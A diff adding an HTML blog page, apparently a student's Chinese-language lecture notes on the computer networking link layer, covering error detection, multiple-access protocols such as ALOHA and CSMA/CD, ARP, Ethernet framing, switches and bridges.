@@ -150,6 +150,713 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-cn">
+    <link itemprop="mainEntityOfPage" href="http://hornos3.github.com/2023/03/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E2%80%94%E2%80%94%E7%AC%AC6%E7%AB%A0/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="CoLin">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="CoLin's BLOG">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2023/03/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E2%80%94%E2%80%94%E7%AC%AC6%E7%AB%A0/" class="post-title-link" itemprop="url">计算机网络——第6章</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+              
+
+              <time title="Created: 2023-03-02 23:52:16 / Modified: 23:52:35" itemprop="dateCreated datePublished" datetime="2023-03-02T23:52:16+08:00">2023-03-02</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E8%AF%BE%E5%86%85%E7%AC%94%E8%AE%B0/" itemprop="url" rel="index"><span itemprop="name">课内笔记</span></a>
+                </span>
+                  , 
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E8%AF%BE%E5%86%85%E7%AC%94%E8%AE%B0/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/" itemprop="url" rel="index"><span itemprop="name">计算机网络</span></a>
+                </span>
+            </span>
+
+          <br>
+            <span class="post-meta-item" title="Symbols count in article">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">Symbols count in article: </span>
+              <span>9.8k</span>
+            </span>
+            <span class="post-meta-item" title="Reading time">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">Reading time &asymp;</span>
+              <span>9 mins.</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p>链路层服务的原则：</p>
+<ul>
+<li>错误检测，校正</li>
+<li>共享广播信道：多址访问</li>
+<li>链路层寻址</li>
+<li>局域网：以太网，VLAN</li>
+</ul>
+<p>实例化，各种链路层技术的实现</p>
+<h2 id="61-链路层概述"><a class="markdownIt-Anchor" href="#61-链路层概述"></a> 6.1 链路层概述</h2>
+<ul>
+<li>节点：主机和路由器</li>
+<li>链路：沿着通信路径连接相邻节点的通信信道，分为有线和无线链路</li>
+<li>帧：数据链路层的分组单元</li>
+</ul>
+<p>数据链路层的主要功能：负责将数据包通过链路从一个结点传输到物理上相邻的节点</p>
+<p>数据链路层的简单模型：一个主机向另一个主机发送数据，期间经过多个路由器，通过了多个网络，数据在这些网络中流动。</p>
+<p>说明：</p>
+<ul>
+<li>数据报咋不同链路上可能由不同的链路层协议进行处理
+<ul>
+<li>如第一段链路由PPP处理，最后一段链路由以太网处理等</li>
+</ul>
+</li>
+<li>不同的链路层协议可能提供不同的服务，如可靠传递等</li>
+</ul>
+<h3 id="611-链路层提供的服务类型"><a class="markdownIt-Anchor" href="#611-链路层提供的服务类型"></a> 6.1.1 链路层提供的服务类型</h3>
+<ul>
+<li>成帧、链路访问
+<ul>
+<li>将数据加上头部和尾部，以此封装为数据帧</li>
+<li>共享介质的信道访问</li>
+<li>帧头部用MAC地址标识源和目的，不同于IP地址</li>
+</ul>
+</li>
+<li>可靠传递
+<ul>
+<li>很少用于误码率低的链路（光纤、双绞线链路）</li>
+<li>用于误码率高的链路（无线链路）</li>
+</ul>
+</li>
+<li>流量控制
+<ul>
+<li>在相邻的收发节点之间限制流量</li>
+</ul>
+</li>
+<li>差错检测
+<ul>
+<li>信号衰减和电磁干扰噪声容易导致出错，接收方检测到错误存在时，会给发送方发送信号要求重传或者丢弃该数据帧</li>
+</ul>
+</li>
+<li>差错纠正
+<ul>
+<li>接收方检测和纠正帧中错误，不用重传</li>
+</ul>
+</li>
+<li>半双工和全双工
+<ul>
+<li>半双工时链路两段的节点都能够传输分组但不能同时传输</li>
+</ul>
+</li>
+</ul>
+<h3 id="612-链路层在何处实现"><a class="markdownIt-Anchor" href="#612-链路层在何处实现"></a> 6.1.2 链路层在何处实现</h3>
+<p>链路层的主体部分是在网络适配器中实现的，网络适配器有时也称为网络接口卡，位于网络适配器的核心是链路层控制器，其中实现了多个链路层服务。</p>
+<p>适配器通信</p>
+<ul>
+<li>在每一台设备上都有一个适配器（主机、交换机、路由器等）</li>
+<li>链路层在适配器或芯片上实现</li>
+<li>直接与主机的系统总线相连，与其他连接主机的IO设备相同</li>
+<li>是硬件、软件和固件的结合体</li>
+<li>适配器是半自治单元
+<ul>
+<li>网络接口卡或芯片是适配器</li>
+<li>帧的发送和接收、检错、丢弃都是适配器自主进行的</li>
+<li>向上提交数据时，需要节点干预</li>
+<li>最终受控于节点</li>
+</ul>
+</li>
+<li>发送方在一个帧内封装数据报，增加差错检测位，可靠交付，流量检测等；接收方查找错误，可靠交付，进行流量控制，取出数据报并交给网络层。</li>
+</ul>
+<h2 id="62-差错检测和纠正技术"><a class="markdownIt-Anchor" href="#62-差错检测和纠正技术"></a> 6.2 差错检测和纠正技术</h2>
+<p>在发送节点，为了保护比特免受差错，使用<font color=red>差错检测和纠正比特EDC</font>来增强数据D。通常要保护的数据不仅从网络层传递下来需要通过链路传输的数据报，而且包括链路层首部中的链路级的寻址信息、序号和其他字段。链路级帧中的D和EDC都被发送到接收节点。<font color=red>差错检测不是100%可靠的，EDC越长可靠程度越高，检错和纠错的能力越强</font>。</p>
+<h3 id="621-奇偶校验"><a class="markdownIt-Anchor" href="#621-奇偶校验"></a> 6.2.1 奇偶校验</h3>
+<p>最简单的差错检测方式就是单个比特的奇偶校验，但是检错能力太差了，因此可以使用二维奇偶校验方法，包含比特值改变的列和行的校验值都将会出现差错，因此接收方不仅可以检查到单个比特出错，还可以纠正。</p>
+<p>接收方检测和纠正差错的能力被称为<font color=red>前向纠错</font>。</p>
+<h3 id="622-检验和方法"><a class="markdownIt-Anchor" href="#622-检验和方法"></a> 6.2.2 检验和方法</h3>
+<p>因特网检查和</p>
+<ul>
+<li>目标：检测发送包中的错误，仅用于运输层</li>
+<li>发送方：
+<ul>
+<li>将数据段的内容作为16比特的整数序列</li>
+<li>校验和：累加求和，计算和的反码</li>
+<li>发送方将得到的校验和值放入到PDU校验和字段</li>
+</ul>
+</li>
+<li>接收方
+<ul>
+<li>计算收到的数据段的校验和</li>
+<li>检查计算出的校验和与校验和字段中的值是否相同
+<ul>
+<li>如果不同则检测到错误</li>
+<li>如果相同则<font color=red>认为</font>没有监测错误（不代表就一定没有错误）</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>仅用于TCP、UDP和IPv4协议之中</li>
+</ul>
+<h3 id="623-循环冗余纠错crc"><a class="markdownIt-Anchor" href="#623-循环冗余纠错crc"></a> 6.2.3 循环冗余纠错CRC</h3>
+<p>对于d个比特的数据D，选择r+1比特模式（生成多项式）表示为G，目标是选择r个CRC比特R使得：<br />
+- &lt;D,R&gt;刚好能够被G整除（模2计算）<br />
+- 接收方已知G，用G去除&lt;D,R&gt;，如果余数不为0则检测到错误<br />
+- 能检测到所有小于r+1个比特的错误</p>
+<h2 id="63-多路访问即多址访问链路与协议"><a class="markdownIt-Anchor" href="#63-多路访问即多址访问链路与协议"></a> 6.3 多路访问（即多址访问）链路与协议</h2>
+<p>链路分为两种：</p>
+<ul>
+<li>点到点链路，由链路一端的单个发送方和链路另一端的单个接收方组成。如PPP、以太网交换机和主机之间点到点的链路</li>
+<li>广播链路，能够让多个发送和接收节点连接到相同的、单一的、共享的广播信道上。如传统以太网、802.11无线LAN。
+<ul>
+<li>特点：
+<ul>
+<li>单个共享广播信道</li>
+<li>当两个或多个节点同时传输时，会产生相互干扰。</li>
+<li>碰撞：一个节点同时收到两个或多个信号</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<p>多址访问协议：</p>
+<ul>
+<li>分布式算法决定节点如何共享信道，如结点何时可以传输数据</li>
+<li>特别注意：有关共享信道的通信需要使用信道本身，没有额外的信道用于协调</li>
+<li>理想的多址访问协议需要满足：
+<ul>
+<li>假定：信道为速率为Rb/s的广播信道</li>
+<li>当只有一个节点有数据发送时，该结点的吞吐量为R</li>
+<li>当M个节点有数据发送时，每一个结点的吞吐量为R/M</li>
+<li>分散，没有特定节点用于调整传输，没有时钟同步</li>
+<li>简单，容易实现</li>
+</ul>
+</li>
+<li>多路访问协议的分类：
+<ul>
+<li>信道划分协议
+<ul>
+<li>将信道划分为多个小片（使用时隙、频率、编码等划分）</li>
+<li>将不同的片分配给不同的节点使用</li>
+</ul>
+</li>
+<li>随机访问协议
+<ul>
+<li>信道没有被分割，允许碰撞</li>
+<li>需要有碰撞恢复的技术</li>
+</ul>
+</li>
+<li>轮流协议
+<ul>
+<li>节点轮流传送，但是数据量大的节点轮流更长时间</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h3 id="631-信道划分协议"><a class="markdownIt-Anchor" href="#631-信道划分协议"></a> 6.3.1 信道划分协议</h3>
+<p>信道划分分为时分复用、统计时分复用、频分复用和随机访问这几种。</p>
+<p>信道划分协议TDMA</p>
+<ul>
+<li>时分复用TDM
+<ul>
+<li>循环访问信道，每一个结点在每一次循环中得到固定长度的时隙（时隙长度=传输单个分组的时间）</li>
+<li>没有数据发送的时隙空闲</li>
+</ul>
+</li>
+<li>统计时分复用STDM
+<ul>
+<li>使用STDM帧作为基本单位，一个STDM帧可以容纳多个分组，时隙数量小于用户数量。</li>
+<li>每当用户需要发送分组时将其发送到集中器中的集中缓存</li>
+<li>集中器按照一定的顺序依次扫描用户是否输入，将缓存中的输入数据放到STDM帧中，没有数据的缓存跳过，当一个帧的数据放满时发送。</li>
+<li>是时分复用的改进</li>
+</ul>
+</li>
+<li>信道划分协议FDMA
+<ul>
+<li>信道按照频谱分为若干个频段</li>
+<li>每一个节点分配固定的频段</li>
+<li>在频段不用时该部分信道就被闲置浪费了</li>
+</ul>
+</li>
+</ul>
+<h3 id="632-随机访问协议"><a class="markdownIt-Anchor" href="#632-随机访问协议"></a> 6.3.2 随机访问协议</h3>
+<ul>
+<li>当节点有数据发送时
+<ul>
+<li>以信道全部速率R传输</li>
+<li>没有主节点起到协调作用</li>
+</ul>
+</li>
+<li>两个或多个节点传送时会发送碰撞</li>
+<li>需要有检测碰撞和恢复碰撞的技术，如延时之后重传</li>
+<li>ALOHA，时隙ALOHA等</li>
+</ul>
+<h4 id="aloha"><a class="markdownIt-Anchor" href="#aloha"></a> ALOHA</h4>
+<p>Additive Link On-Line HAwaii system，是计算机网络早期发展中一个著名的网络，至今还在运行。</p>
+<p>特征：</p>
+<ul>
+<li>网络拓扑采用星形结构</li>
+<li>为了节省费用和易于组网，网络中各个站点的通信采用无线传输介质</li>
+<li>由于采用无线电信道。考虑到无法申请更多的频率点，因此所有站点都使用同一的频率通过主机交换信息</li>
+</ul>
+<p>工作原理：</p>
+<ul>
+<li>当一帧首次到达（即一个网络层数据报在发送节点从网络层传递下来），节点立刻将该帧完整地传输到广播信道中，取帧传输时间为时间单元。</li>
+<li>在任何给定时间，某个结点传输一个帧的概率为p。在其传输过程中其他节点不能传输，根据计算，一次传输成功的概率为p(1-p)<sup>2(N-1)</sup>。ALOHA协议的最大效率为1/2e。</li>
+<li>如果发生了碰撞，节点等待随机的一段时间之后重新发送分组。</li>
+<li><font color=red>ALOHA系统中一个节点并不会关心其他结点是否正在发送帧，这也就是为什么纯ALOHA一次传输成功的概率为p(1-p)<sup>2(N-1)</sup>，对于一个在t时刻开始传输的帧（所有帧传输时间为1）而言，需要从t-1到t+1的这段时间内都没有其他的帧开始传输，可见如果传播速率足够快，在该帧还没有发送完的时候，已经有节点能够接收该帧了，但它不会因此而阻止自己不发送自己需要发送的帧。</font></li>
+</ul>
+<h4 id="时隙aloha"><a class="markdownIt-Anchor" href="#时隙aloha"></a> 时隙ALOHA</h4>
+<p>将整个链路以时隙分割，每一个主机如果要发送分组，则必须在每一个时隙之内将分组发送完成。如果有冲突则随机等待几个时隙之后重发。</p>
+<h4 id="载波侦听多路访问csma"><a class="markdownIt-Anchor" href="#载波侦听多路访问csma"></a> 载波侦听多路访问CSMA</h4>
+<p>在时隙和纯ALOHA中，一个节点传输的决定独立于连接到这个广播信道上的其他节点的活动。特别是一个结点不关心在它开始传输时是否有其他节点正在传输。</p>
+<p>载波侦听：在传输前首先对链路进行监听，如果信道空闲，则传输整个帧，否则等待。<font color=red>但是碰撞还是可能发生。如果一个信道的延迟时间比较长，当其他主机开始发送分组时，这个分组可能不会很快地传到当前主机，使得当前主机误以为信道中没有分组正在传输，因此可能存在其传输还未完成时发现有碰撞的情况。</font></p>
+<p>CSMA分类：</p>
+<ul>
+<li>非坚持CSMA，一旦监听到信道忙，就不再继续监听，而是根据协议的算法延迟一个随机的时间之后重新监听。如果进行载波监听时发现信道空闲，则将准备好的帧发送出去。</li>
+<li>时隙非坚持CSMA，采用划分时隙的随机接入CSMA协议，协议规定只能在每一个时隙开始时才能发送帧。</li>
+<li>1坚持CSMA，一个站点要传送数据之前首先监听信道，如果忙则持续等待到监听到信道空闲时发送数据，如果发生冲突则站点等待一个随机长的时间然后重新开始。</li>
+<li>P坚持CSMA，一个站点要传送数据之前首先监听信道，如果忙则持续等待到监听到信道空闲时，以概率P发送数据，而以（1-P）延迟一段时间τ（网络中最远的端到端传播时延），重新监听信道。如果发生冲突，站点等待一个随机长的时间，然后重新开始。</li>
+</ul>
+<p>CSMA比较：</p>
+<ul>
+<li>非坚持：不能充分利用信道刚刚转入空闲期的这段时间</li>
+<li>1坚持：容易在上述这段时间之内产生冲突，实际网络常用</li>
+<li>P坚持：很难选择一个用于各种通信量度的P值</li>
+</ul>
+<h4 id="具有碰撞检测的载波监听多路访问csmacd"><a class="markdownIt-Anchor" href="#具有碰撞检测的载波监听多路访问csmacd"></a> 具有碰撞检测的载波监听多路访问（CSMA/CD）</h4>
+<ul>
+<li>在短时间内碰撞能够被检测
+<ul>
+<li>在有线LANs中比较容易：测量信号强度，比较收发的信号</li>
+<li>在无线LANs中比较困难：传输时接收器关闭，接收的信号远小于发送的信号强度</li>
+</ul>
+</li>
+<li>碰撞之后停止传输，减少信道浪费</li>
+<li>强化碰撞
+<ul>
+<li>当发送数据的站一旦发现产生碰撞，除了立即停止发送数据之外，还要继续发送若干比特的人为干扰信号，以便让所有的用户都知道现在已经发生了碰撞</li>
+</ul>
+</li>
+</ul>
+<p>争用期：</p>
+<ul>
+<li>最先发送数据帧的站，在发送数据帧之后至多经过2τ（最长的端到端时延）时间就可以知道发送的数据帧是否遭受碰撞</li>
+<li>以太网的端到端往返时延2τ称为争用期，或碰撞窗口</li>
+<li>经过争用期这段时间还没有检测到碰撞，就可以确认这次发送没有碰撞</li>
+</ul>
+<p>以太网CSMA/CD算法：</p>
+<ul>
+<li>网卡从网络层接收数据报，并创建数据帧</li>
+<li>如果网卡检测信道空闲，则开始进行帧传输</li>
+<li>如果网卡检测信道忙，则等待直到信道关闭，然后发送</li>
+<li>如果网卡发送整个帧没有探测到另一个传输，则网卡完成帧发送</li>
+<li>如果网卡检测到另一个传输，则传输终止并发送干扰信号</li>
+<li>传输终止之后，使用二进制退避（网卡随机从0/1/2/3/…/2<sup>m</sup>-1之中选择K，网卡等待K*512bit时间，返回第2步）越多的碰撞决定越大的退避间隔</li>
+</ul>
+<h3 id="633-轮流协议"><a class="markdownIt-Anchor" href="#633-轮流协议"></a> 6.3.3 轮流协议</h3>
+<p>为了满足：当有M个节点活跃时，每一个活跃节点的吞吐量接近R/M bps，开发了此协议。</p>
+<ul>
+<li>信道划分协议的特点：
+<ul>
+<li>在负荷重时，共享信道有效公平</li>
+<li>在负荷轻时效率低，信道访问延时，即使只有一个活动结点也只能分配到1/N的带宽</li>
+</ul>
+</li>
+<li>随机访问协议的特点：
+<ul>
+<li>在负荷轻时效率高，只有一个节点也能够充分利用信道</li>
+<li>在负荷重时将会产生巨大的碰撞开销</li>
+</ul>
+</li>
+</ul>
+<h4 id="轮询协议"><a class="markdownIt-Anchor" href="#轮询协议"></a> 轮询协议</h4>
+<ul>
+<li>要求这些节点之一要被指定为主节点。</li>
+<li>主节点以循环的方式轮询每一个节点。主节点首先向节点1发送一个报文说明其能够传输的帧的最多数量，然后在节点1传输了某些帧之后，主节点再发送报文向节点2说明，以此类推。</li>
+<li>这个协议引入了轮询时延的开销，且如果主节点故障，整个网络都将崩溃。</li>
+</ul>
+<h4 id="令牌传递协议"><a class="markdownIt-Anchor" href="#令牌传递协议"></a> 令牌传递协议</h4>
+<ul>
+<li>没有主节点，一个称为令牌的小的特殊帧在节点之间以某种固定的次序进行交换。</li>
+<li>当一个节点收到令牌时，仅当它有一些帧要发送时，它才持有这个令牌，否则立即向下一个节点转发该令牌。当一个节点收到令牌时，如果它确实有帧要传输，它发送最大数目的帧数，然后把令牌转发给下一个节点。</li>
+<li>令牌传递分散，并高效，但一个节点的故障可能会使整个信道崩溃。如果一个节点偶然忘记了释放令牌，则必须调用某些恢复步骤使得令牌返回到循环。</li>
+</ul>
+<h4 id="总结对共享介质的处理"><a class="markdownIt-Anchor" href="#总结对共享介质的处理"></a> 总结：对共享介质的处理</h4>
+<ul>
+<li>信道划分，可基于时间、频率、编码，分为时分和频分</li>
+<li>随机划分（动态）
+<ul>
+<li>ALOHA，S-ALOHA，CSMA，CSMA/CD</li>
+<li>载波侦听：有线较容易，无线较困难</li>
+<li>CSMA/CD 用于以太网</li>
+<li>CSMA/CA 用于802.11</li>
+</ul>
+</li>
+<li>轮流
+<ul>
+<li>主节点轮询，令牌传递</li>
+</ul>
+</li>
+</ul>
+<h2 id="64-交换局域网"><a class="markdownIt-Anchor" href="#64-交换局域网"></a> 6.4 交换局域网</h2>
+<h3 id="641-链路层寻址与arp"><a class="markdownIt-Anchor" href="#641-链路层寻址与arp"></a> 6.4.1 链路层寻址与ARP</h3>
+<h4 id="mac地址lan地址物理地址"><a class="markdownIt-Anchor" href="#mac地址lan地址物理地址"></a> MAC地址（LAN地址，物理地址）</h4>
+<p>作用：在数据链路层表示每一块网络适配器，使得能够在广播信道上寻找目标节点<br />
+组成：</p>
+<ul>
+<li>48 bit</li>
+<li>前24bit由IEEE分配管理——OUI号</li>
+<li>后24bit由厂商自行分配</li>
+<li>IEEE管理MAC地址空间</li>
+</ul>
+<p><font color=red>MAC地址是烧在网络适配器的ROM中，不可修改（软件模拟的可以修改）</font></p>
+<p>与IP地址比较：</p>
+<ul>
+<li>MAC地址是平面地址，类似于身份证号</li>
+<li>IP地址是层次地址，类似于邮政通信地址</li>
+<li>MAC地址在不同的网络之间迁移时，不会改变</li>
+<li>IP地址在不同的网络之间迁移时，需要改变以适应新的网络配置</li>
+<li>无线网络中进行漫游时，如果在不同的网络之间切换时，改变网络设置会导致连接中断。</li>
+</ul>
+<p>MAC地址的重要性：</p>
+<ul>
+<li>局域网设备不能识别IP地址，因为其工作在链路层，因此只能够通过MAC地址寻找主机。</li>
+<li>进程产生的套接字是端口号+IP地址，在局域网中是通过IP地址获得MAC地址。</li>
+<li>通过ARP（地址解析协议）可以在已知IP地址的情况下，获得MAC地址。</li>
+</ul>
+<h4 id="地址解析协议arp"><a class="markdownIt-Anchor" href="#地址解析协议arp"></a> 地址解析协议（ARP）</h4>
+<p>目标：根据目标的IP地址获取其MAC地址<br />
+ARP高速缓存（ARP表）</p>
+<ul>
+<li>每一个IP节点（主机、路由器）都有ARP表</li>
+<li>局域网节点的IP/MAC地址映射：&lt;IP; MAC; TTL&gt;</li>
+<li>TTL：时限，Time to Live，超过TTL的地址映射会被删除（一般20分钟）</li>
+</ul>
+<p>ARP协议工作流程：</p>
+<ul>
+<li>建立ARP请求包</li>
+<li>广播发送该ARP请求包，其中包含目标的IP地址。广播的MAC地址为全1，即FF:FF:FF:FF:FF:FF</li>
+<li>目的主机接收到该ARP请求包，建立包含自己的MAC地址的ARP应答包（请求包和应答包的源、目标是不一致的）并发送</li>
+<li>发出请求的主机接收到该数据包之后，更新ARP高速缓存</li>
+</ul>
+<p>当一台主机需要发送数据到另一个子网的主机时，首先需要通过ARP报文获取目标主机的MAC地址，然后在发送IP报文时，<font color=red>MAC地址不应该填目标主机的MAC，而应该是路由器的MAC，这样路由器才能将这个报文转发到另外一个子网。</font></p>
+<h3 id="642-以太网"><a class="markdownIt-Anchor" href="#642-以太网"></a> 6.4.2 以太网</h3>
+<p>类型：</p>
+<ul>
+<li>总线式以太网：所有的主机都与一条总线连接，接收到不是发送到本机的报文则不予理会。</li>
+<li>交换式以太网：主机与主机通过交换机连接为网状结构。</li>
+</ul>
+<h4 id="以太网帧结构"><a class="markdownIt-Anchor" href="#以太网帧结构"></a> 以太网帧结构</h4>
+<ul>
+<li>数据字段：46~1500字节</li>
+<li>前同步码：8字节，前面7个字节的格式为10101010，最后一个字节为10101011，用于同步发送方与接收方的时钟</li>
+<li>地址：6字节，若适配器收到以太网帧，目的地址为自己的MAC地址或广播地址，就将帧中的数据传给网络层，否则适配器丢弃该帧</li>
+<li>类型：上层协议类型（大多为IP协议，也支持其他协议）</li>
+<li>CRC：由接收方检查，如果检测到错误就将该帧丢弃</li>
+</ul>
+<p>以太网提供的服务：</p>
+<ul>
+<li>无连接服务：在发送适配器和接收适配器之间不需要另外的连接操作</li>
+<li>不可靠服务：接收适配器不发送确认帧或否认帧给发送方</li>
+<li>交给网络层的数据包可能存在间隙，如果应用使用TCP，间隙会被填充，否则应用会看见间隙</li>
+</ul>
+<p>以太网使用的CSMA/CD</p>
+<ul>
+<li>没有时隙</li>
+<li>当适配器侦听到其他的适配器在传输时，它不传输帧，即载波侦听</li>
+<li>正在传输的适配器如果检测到其他适配器也在传输，则其终止自己的传输，即碰撞检测</li>
+<li>在重新传输之前，适配器等待一段随机时间，即随机访问</li>
+</ul>
+<p>算法流程：</p>
+<ul>
+<li>适配器收到来自网络层的数据包，创建帧</li>
+<li>若适配器检测到信道空闲，则开始传输帧；若检测到信道忙，就开始等待，直到信道空闲时才开始传输该帧</li>
+<li>若适配器传输了整个帧而没有检测到其他适配器的传输，则该适配器完成该帧的传输</li>
+<li>若适配器在传输时检测到其他适配器也在传输，则停止传输并发出拥塞信号</li>
+<li>终止传输之后适配器进入指数回退阶段，在经历第m次碰撞之后，适配器随机从{0, 1, 2, …, 2<sup>m-1</sup>}中选择k值。适配器等待k*512比特时间之后返回第2步</li>
+</ul>
+<p>拥塞信号：用于确保所有传输者都能检测到碰撞而传输的信号，共48比特<br />
+比特时间：传输1个比特所用的时间</p>
+<p>指数回退算法</p>
+<ul>
+<li>目的：适配器重传时试图估计正确的负载。</li>
+<li>重载：随机等待的时间可能会更长。</li>
+<li>第一次碰撞：从{0, 1}中选择K；延迟是K*512比特传输时间</li>
+<li>第二次碰撞：从{0, 1, 2}中选择K</li>
+<li>…</li>
+</ul>
+<p>重要特性：</p>
+<ul>
+<li>使用CSMA/CD协议的以太网不能进行全双工通信，而只能使用双向交替通信（半双工通信）</li>
+<li>每一个站在发送数据之后的一小段时间之内存在遭遇碰撞的可能性</li>
+<li>这种发送的不确定性使得整个以太网的平均通信量远小于以太网的最高数据率</li>
+</ul>
+<p>争用期长度：</p>
+<ul>
+<li>10Mb/s的以太网取51.2μs为争用期的长度，100Mb/s为其1/10</li>
+<li>对于10Mb/s的以太网，在争用期之内可以发送512比特（64字节）</li>
+<li>以太网在发送数据时，如果前64字节没有发生碰撞，则后续的数据旧不会发生碰撞</li>
+</ul>
+<p>最短有效帧长</p>
+<ul>
+<li>如果发生碰撞，就一定会发生在发送的前64字节内</li>
+<li>由于一检测到碰撞就立刻中止发送，则此时已经发送出去的数据量一定小于64字节</li>
+<li>以太网规定<font color=red>最短的有效帧长为64字节</font>，凡是长度小于64字节的帧都是由于冲突而异常中止的无效帧</li>
+</ul>
+<h4 id="物理层简介"><a class="markdownIt-Anchor" href="#物理层简介"></a> 物理层简介</h4>
+<p>信号编码：</p>
+<ul>
+<li>曼彻斯特编码：设置0为上升沿，1为下降沿</li>
+<li>差分曼彻斯特编码：0翻转，1不翻转</li>
+</ul>
+<p>集线器互联</p>
+<ul>
+<li>主干集线器互联LAN网段</li>
+<li>扩展了节点之间的最大距离</li>
+<li>原先独立的网段碰撞域变成了一个大的碰撞域</li>
+<li>不能将10BaseT和100BaseT的以太网互联
+<ul>
+<li>10和100代表速率，T代表使用双绞线</li>
+<li>节点连接到集线器，是一个星形的拓扑形状。在节点和集线器之间的最大距离为100m</li>
+<li>10Base5代表粗同轴电缆，可靠性好，抗干扰能力强。
+<ul>
+<li>收发器：用于发送、接收数据，冲突检测，电气隔离等。</li>
+<li>AUI：连接件单元接口</li>
+<li>这种电缆一般使用总线型拓扑，用于网络骨干连接</li>
+</ul>
+</li>
+<li>10Base2代表细同轴电缆，可靠性稍差
+<ul>
+<li>使用BNC T型接头连接，使用总线型拓扑，可用于办公室LAN</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>集线器
+<ul>
+<li>集线器本质上是物理层的中继器</li>
+<li>从一个接口收到的比特流会传给其他所有接口</li>
+<li>同样速率</li>
+<li>没有帧缓存</li>
+<li>集线器没有CSMA/CD，由适配器检测碰撞</li>
+<li>提供网络管理功能（可网管、智能、网络分段）</li>
+</ul>
+</li>
+<li>千兆以太网
+<ul>
+<li>使用标准以太网帧格式</li>
+<li>允许点对点链路和共享的广播信道</li>
+<li>共享信道时使用CSMA/CD，为了得到可接受的效率，节点之间的距离需要短一些</li>
+<li>对于点到点链路可以以1Gbps的速率全双工工作</li>
+</ul>
+</li>
+</ul>
+<h3 id="643-链路层交换机"><a class="markdownIt-Anchor" href="#643-链路层交换机"></a> 6.4.3 链路层交换机</h3>
+<ul>
+<li>链路层设备
+<ul>
+<li>存储、转发以太网帧</li>
+<li>查看输入帧的MAC地址，选择性地将帧输出到一个或多个输出链路，使用CSMA/CD</li>
+<li>对外透明，主机不知道交换机的存在</li>
+<li>即插即用，自学习，交换机无需配置</li>
+</ul>
+</li>
+<li>交换机：多路同时传输
+<ul>
+<li>主机直接连接到交换机</li>
+<li>交换机缓存到数据包</li>
+<li>每一条链路都采用了以太网协议，但之间没有冲突，全双工通信
+<ul>
+<li>每一条链路是其自身的冲突碰撞域</li>
+<li><font color=red>这里的全双工通信指的是当两个主机之间存在至少一台交换机时，可以进行全双工通信，其中的每一条物理链路都是半双工的，但由于交换机可以进行存储转发工作，所以两边的两个分组在某一个交换机会相遇，然后各自继续在链路中传输。</font></li>
+</ul>
+</li>
+<li>交换机中存在一个交换表
+<ul>
+<li>表结构：主机MAC地址，连接主机的接口，时间戳（产生表项的时间）</li>
+<li>与路由表类似</li>
+</ul>
+</li>
+<li>交换机通过学习可知通过哪一个接口可以到达哪一个主机
+<ul>
+<li>当数据帧进入交换机时，交换机学习发送方连接的接口，并将发送方/接口对记录到交换表</li>
+</ul>
+</li>
+<li>交换机：帧过滤/转发
+<ul>
+<li>使用发送方输入接口与MAC地址</li>
+<li>使用目标MAC地址检索交换表</li>
+<li>如果检索到目标地址对应的接口，当目标地址接口不是来源接口时，从该接口转发数据帧，否则丢弃该数据帧。如果没有检索到接口则向所有非来源接口转发数据帧广播</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<p>网桥互联</p>
+<ul>
+<li>网桥实质上就是一种存储-转发设备，用于实现MAC层的LAN互连</li>
+<li>工作原理：
+<ul>
+<li>不断监听各端口是否有信号</li>
+<li>收到无差错的帧则缓存，反之将差错帧丢弃</li>
+<li>若所收帧的目的MAC地址属于另一网段，则通过站表决定向何端口转发</li>
+<li>网桥不转发同一“网段”内通信的帧
+<ul>
+<li>目的主机和源主机不连接在网桥的同一个接口上才会转发</li>
+</ul>
+</li>
+<li>网桥不会修改所转发的帧的源地址</li>
+</ul>
+</li>
+<li>网桥的优势
+<ul>
+<li>过滤通信量</li>
+<li>扩大了局域网的物理范围</li>
+<li>提高可靠性</li>
+<li>可互联不同物理层、不同MAC子层和不同速率的局域网</li>
+</ul>
+</li>
+<li>网桥的缺点
+<ul>
+<li>接收和转发产生时延</li>
+<li>MAC子层没有流量控制功能，网络负荷重时，网桥缓存空间可能发生溢出，产生帧丢失现象</li>
+<li>不同MAC子层的网段桥接时，在转发帧之前要修改帧的某些字段，这也需要时间</li>
+<li>广播风暴。网桥只适合用户少于几百个和通信量不太大的局域网，当广播信息过多时会产生拥塞</li>
+</ul>
+</li>
+<li>网桥和集线器的区别
+<ul>
+<li>集线器只是将网络覆盖距离简单地延长，且距离有限，实现在物理层。网桥不仅具有将LAN的覆盖距离延长的作用，而且理论上可以做到无限延长，具体实现在MAC层</li>
+<li>集线器仅具有简单的信号整形和放大功能，网桥属于一种智能互联设备，主要提供信号的存储、转发、数据过滤、路由选择等能力</li>
+<li>集线器仅是一种硬件设备，网桥还有软件</li>
+<li>集线器只能互联同类的LAN，而网桥可以互联不同类型的LAN</li>
+</ul>
+</li>
+<li>透明网桥：网桥对于局域网其他的站点时不可见的</li>
